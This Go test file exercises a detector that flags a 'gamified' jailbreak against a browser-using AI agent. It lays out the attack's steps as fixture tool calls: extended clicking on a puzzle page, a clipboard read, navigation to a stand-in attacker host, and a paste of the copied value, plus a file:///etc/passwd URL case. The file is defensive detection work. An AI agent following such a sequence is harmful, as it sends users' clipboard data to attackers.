package mcp

import "testing"

// gameEngage / gameCredentialRead / gameNavigateAway / gameDisclose are
// representative calls for the four stages of the gamified context-reframing
// jailbreak pattern, used across the accumulation tests.
var (
	gamePageOrigin  = "puzzle.example.com"
	gameNewOrigin   = "attacker.example.net"
	gameClick       = call{"click", map[string]interface{}{"selector": "#next-level"}}
	gameNavigateIn  = call{"browser_navigate", map[string]interface{}{"url": "https://" + gamePageOrigin + "/game"}}
	gameClipboard   = call{"read_clipboard", map[string]interface{}{}}
	gameNavigateOut = call{"browser_navigate", map[string]interface{}{"url": "https://" + gameNewOrigin + "/submit"}}
	gamePaste       = call{"paste", map[string]interface{}{"text": "the-copied-value"}}
)

// gameEngagementCalls returns browserGameMinInteractions click calls — the
// minimum "extended interaction" needed before the composite can arm.
func gameEngagementCalls() []call {
	calls := make([]call, browserGameMinInteractions)
	for i := range calls {
		calls[i] = gameClick
	}
	return calls
}

// TestBrowserGameJailbreakTracker_FiresOnFullSequence verifies the composite
// fires exactly on the call that completes the sequence: navigate in, engage,
// read clipboard, navigate to a new origin, then paste with payload content.
func TestBrowserGameJailbreakTracker_FiresOnFullSequence(t *testing.T) {
	tr := NewBrowserGameJailbreakTracker()

	sequence := []call{gameNavigateIn}
	sequence = append(sequence, gameEngagementCalls()...)
	sequence = append(sequence, gameClipboard, gameNavigateOut, gamePaste)

	var fires int
	for i, c := range sequence {
		sig := tr.Scan(c.tool, c.args)
		if sig == SignalBrowserGameJailbreakSession {
			fires++
			if i != len(sequence)-1 {
				t.Errorf("fired early on call %d (%s)", i, c.tool)
			}
		}
	}
	if fires != 1 {
		t.Fatalf("expected exactly one fire, got %d", fires)
	}

	// Post-completion calls must not re-fire.
	if again := tr.Scan(gamePaste.tool, gamePaste.args); again != "" {
		t.Error("tracker re-fired after completion")
	}
}

// TestBrowserGameJailbreakTracker_InsufficientEngagementNoFire ensures the
// composite does NOT fire when the interaction count stays below the
// engagement threshold — a single incidental click is not "extended
// back-and-forth interaction."
func TestBrowserGameJailbreakTracker_InsufficientEngagementNoFire(t *testing.T) {
	tr := NewBrowserGameJailbreakTracker()
	tr.Scan(gameNavigateIn.tool, gameNavigateIn.args)
	tr.Scan(gameClick.tool, gameClick.args) // only 1 interaction, below the threshold
	tr.Scan(gameClipboard.tool, gameClipboard.args)
	tr.Scan(gameNavigateOut.tool, gameNavigateOut.args)
	if sig := tr.Scan(gamePaste.tool, gamePaste.args); sig != "" {
		t.Error("insufficient engagement (below threshold) must not fire the composite")
	}
}

// TestBrowserGameJailbreakTracker_NoCredentialReadNoFire ensures the
// composite does NOT fire without an observed clipboard read — plain
// engagement followed by cross-origin navigation and a paste is not, by
// itself, evidence of the game-then-exfiltrate pattern.
func TestBrowserGameJailbreakTracker_NoCredentialReadNoFire(t *testing.T) {
	tr := NewBrowserGameJailbreakTracker()
	tr.Scan(gameNavigateIn.tool, gameNavigateIn.args)
	for _, c := range gameEngagementCalls() {
		tr.Scan(c.tool, c.args)
	}
	// No clipboard read.
	tr.Scan(gameNavigateOut.tool, gameNavigateOut.args)
	if sig := tr.Scan(gamePaste.tool, gamePaste.args); sig != "" {
		t.Error("no clipboard read observed — must not fire the composite")
	}
}

// TestBrowserGameJailbreakTracker_SameOriginNavigationNoFire ensures
// navigating within the SAME origin after engagement + clipboard read does
// not arm the disclosure window — the taxonomy entry requires navigation to
// a DIFFERENT origin.
func TestBrowserGameJailbreakTracker_SameOriginNavigationNoFire(t *testing.T) {
	tr := NewBrowserGameJailbreakTracker()
	tr.Scan(gameNavigateIn.tool, gameNavigateIn.args)
	for _, c := range gameEngagementCalls() {
		tr.Scan(c.tool, c.args)
	}
	tr.Scan(gameClipboard.tool, gameClipboard.args)
	// Navigate again within the SAME origin (different path, same host).
	sameOriginNav := call{"browser_navigate", map[string]interface{}{"url": "https://" + gamePageOrigin + "/level2"}}
	tr.Scan(sameOriginNav.tool, sameOriginNav.args)
	if sig := tr.Scan(gamePaste.tool, gamePaste.args); sig != "" {
		t.Error("same-origin navigation must not arm the cross-origin disclosure window")
	}
}

// TestBrowserGameJailbreakTracker_DisclosureWithoutPayloadNoFire ensures a
// paste/type/submit call with no payload-shaped argument (e.g. a bare click
// styled as "submit" with no carried content) does not fire the composite.
func TestBrowserGameJailbreakTracker_DisclosureWithoutPayloadNoFire(t *testing.T) {
	tr := NewBrowserGameJailbreakTracker()
	tr.Scan(gameNavigateIn.tool, gameNavigateIn.args)
	for _, c := range gameEngagementCalls() {
		tr.Scan(c.tool, c.args)
	}
	tr.Scan(gameClipboard.tool, gameClipboard.args)
	tr.Scan(gameNavigateOut.tool, gameNavigateOut.args)
	noPayload := call{"submit", map[string]interface{}{"selector": "#form"}}
	if sig := tr.Scan(noPayload.tool, noPayload.args); sig != "" {
		t.Error("disclosure call without a payload argument must not fire the composite")
	}
}

// TestBrowserGameJailbreakTracker_OrdinaryBrowsingNoFire is a broad
// false-positive guard: a normal multi-page browsing session with clicks,
// typing, and clipboard use across several unrelated pages must not fire.
func TestBrowserGameJailbreakTracker_OrdinaryBrowsingNoFire(t *testing.T) {
	tr := NewBrowserGameJailbreakTracker()
	session := []call{
		{"browser_navigate", map[string]interface{}{"url": "https://docs.example.com/guide"}},
		{"click", map[string]interface{}{"selector": "#toc-item-1"}},
		{"click", map[string]interface{}{"selector": "#toc-item-2"}},
		{"type_text", map[string]interface{}{"text": "search query"}},
		{"browser_navigate", map[string]interface{}{"url": "https://docs.example.com/guide/page2"}},
		{"click", map[string]interface{}{"selector": "#next"}},
	}
	for i, c := range session {
		if sig := tr.Scan(c.tool, c.args); sig != "" {
			t.Fatalf("ordinary browsing session must not fire (call %d: %s)", i, c.tool)
		}
	}
}

// TestFirstURLOrigin spot-checks the URL-to-host extraction helper.
func TestFirstURLOrigin(t *testing.T) {
	cases := []struct {
		name string
		args map[string]interface{}
		want string
	}{
		{"url key", map[string]interface{}{"url": "https://example.com/path"}, "example.com"},
		{"uri key", map[string]interface{}{"uri": "http://sub.example.org/x"}, "sub.example.org"},
		{"no url", map[string]interface{}{"selector": "#btn"}, ""},
		{"non-http scheme ignored", map[string]interface{}{"url": "file:///etc/passwd"}, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := firstURLOrigin(tc.args); got != tc.want {
				t.Errorf("firstURLOrigin(%v) = %q, want %q", tc.args, got, tc.want)
			}
		})
	}
}
